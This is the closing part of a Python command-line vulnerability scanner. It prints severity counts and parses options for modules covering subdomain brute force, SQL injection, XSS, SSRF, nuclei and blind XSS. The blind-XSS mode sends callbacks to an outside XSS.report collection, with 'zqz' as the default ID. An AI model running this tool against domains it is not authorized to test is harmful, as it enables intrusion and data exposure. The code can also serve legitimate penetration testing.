        # Severity breakdown
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for vuln in self.all_vulnerabilities:
            sev = vuln.get('severity', 'INFO')
            if sev in severity_count:
                severity_count[sev] += 1
        
        print(f"\n{Colors.BOLD}Vulnerabilities by Severity:{Colors.END}")
        print(f"{Colors.RED}  CRITICAL: {severity_count['CRITICAL']}{Colors.END}")
        print(f"{Colors.RED}  HIGH: {severity_count['HIGH']}{Colors.END}")
        print(f"{Colors.YELLOW}  MEDIUM: {severity_count['MEDIUM']}{Colors.END}")
        print(f"{Colors.BLUE}  LOW: {severity_count['LOW']}{Colors.END}")
        print(f"{Colors.CYAN}  INFO: {severity_count['INFO']}{Colors.END}")
        
        # Crypto-specific findings
        if self.crypto_findings:
            print(f"\n{Colors.BOLD}Cryptography Issues:{Colors.END}")
            crypto_critical = [f for f in self.crypto_findings if f.get('severity') == 'CRITICAL']
            for finding in crypto_critical[:3]:
                print(f"{Colors.RED}  • {finding['type']}: {finding.get('source', 'Unknown')[:50]}...{Colors.END}")
        
        # XSS.report reminder
        if self.advanced_xss_findings:
            print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] IMPORTANT:{Colors.END}")
            print(f"{Colors.YELLOW}    Check your XSS.report dashboard for callbacks:{Colors.END}")
            print(f"{Colors.YELLOW}    {Colors.UNDERLINE}https://xss.report/c/{self.xss_report_id}{Colors.END}")
            print(f"{Colors.YELLOW}    Expected callbacks: {len(self.advanced_xss_findings)}{Colors.END}")
        
        print(f"\n{Colors.GREEN}[✓] Enhanced report saved to: {self.output_file}{Colors.END}")


def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Modular Security Scanner v3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full enhanced scan
  python3 scanner.py -d example.com --all
  
  # JS Crypto analysis only
  python3 scanner.py -d example.com -m subdomain jscrypto
  
  # Advanced XSS with custom report ID
  python3 scanner.py -d example.com -m subdomain advancedxss --xss-id abc123
  
  # Complete security audit
  python3 scanner.py -d example.com -m subdomain sqli xss ssrf nuclei jscrypto advancedxss
  
  # Custom output
  python3 scanner.py -d example.com --all -o enhanced_audit.json
        """
    )
    
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., example.com)')
    parser.add_argument('-m', '--modules', nargs='+', 
                        choices=['subdomain', 'sqli', 'xss', 'ssrf', 'nuclei', 'jscrypto', 'advancedxss'],
                        default=['subdomain'],
                        help='Modules to run')
    parser.add_argument('--all', action='store_true', 
                        help='Run all modules including enhanced ones')
    parser.add_argument('--xss-id', default='zqz',
                        help='XSS.report collection ID (default: zqz)')
    parser.add_argument('-o', '--output', default='scan_results.json', 
                        help='Output JSON file (default: scan_results.json)')
    parser.add_argument('-t', '--threads', type=int, default=20,
                        help='Number of threads for subdomain bruteforce (default: 20)')
    
    args = parser.parse_args()
    
    # If --all flag is set, use all modules
    if args.all:
        modules = ['subdomain', 'sqli', 'xss', 'ssrf', 'nuclei', 'jscrypto', 'advancedxss']
    else:
        modules = args.modules
    
    # Initialize enhanced scanner
    scanner = EnhancedMainScanner(args.domain, args.output, args.xss_id)
    scanner.banner()
    scanner.run_enhanced_modules(modules)
    scanner.generate_enhanced_report()


if __name__ == "__main__":
    main()
